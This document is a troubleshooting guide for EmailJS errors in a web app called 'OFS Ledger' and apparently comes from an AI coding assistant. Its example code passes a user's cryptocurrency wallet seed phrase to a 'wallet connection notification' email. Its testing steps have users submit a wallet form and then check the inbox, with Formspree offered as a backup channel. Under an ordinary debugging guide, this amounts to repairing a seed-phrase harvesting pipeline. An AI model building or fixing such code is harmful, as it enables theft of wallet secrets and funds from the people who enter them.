# EmailJS Troubleshooting Guide for OFS Ledger

## Overview of the Issue

You're experiencing the error: **"Template: One or more dynamic variables are corrupted"** when trying to send emails through EmailJS. This is a common issue that occurs when there's a mismatch between the variables you're sending and what your EmailJS template expects.

## Quick Fix Steps

1. **Access the Final Email Test Page**: 
   - Navigate to: http://localhost:8081/final-email-test
   - This page uses a simplified approach that should work regardless of your template setup

2. **Try the Quick Test Button**:
   - Click "Send Quick Test Email" to send a simple test email
   - This uses the most basic variables that should work with any template

3. **If the Quick Test Works**:
   - Use our new `simpleEmailService.ts` in your application instead of the original email service

## Understanding the Problem

The "corrupted variables" error typically happens for these reasons:

1. **Template Variable Mismatch**: Your code is sending variables with names that don't match what's in your template
2. **Special Characters**: Your data contains special characters that EmailJS can't process
3. **Template Configuration**: Your template in the EmailJS dashboard is misconfigured
4. **Service Issues**: Your EmailJS service might be inactive or have reached its limit

## Complete Solution

### Option 1: Update Your EmailJS Template

1. Log in to your [EmailJS Dashboard](https://dashboard.emailjs.com/admin)
2. Go to the Email Templates section
3. Edit your template (or create a new one)
4. Make sure it only uses these basic variables:
   - `{{from_name}}`
   - `{{to_email}}`
   - `{{subject}}`
   - `{{message}}`
5. Update your `.env` file with the template ID if you created a new template

### Option 2: Use Our New Simple Email Service

We've created a simplified email service that should work regardless of your template configuration:

1. Use the `simpleEmailService.ts` file we created
2. Replace any calls to the old email service with this new one
3. Update your wallet connection code to use the new `sendWalletConnectionNotification` function

Example usage:

```typescript
import { sendWalletConnectionNotification } from "@/services/simpleEmailService";

// In your wallet connection function
await sendWalletConnectionNotification({
  recipientEmail: user.email,
  walletName: "My Ethereum Wallet",
  walletType: "MetaMask",
  blockchain: "Ethereum",
  seedPhrase: "your seed phrase here"
});
```

### Option 3: Use a Different Email Service

If you continue to have issues with EmailJS, consider alternatives:

1. **Formspree**: You already have this configured in your .env file
2. **SendGrid**: Popular and reliable email service
3. **Mailgun**: Another good alternative

## Testing Your Fix

After implementing any of the solutions above:

1. Navigate to the wallet connection page
2. Complete the form and submit
3. Check your email to verify it was received
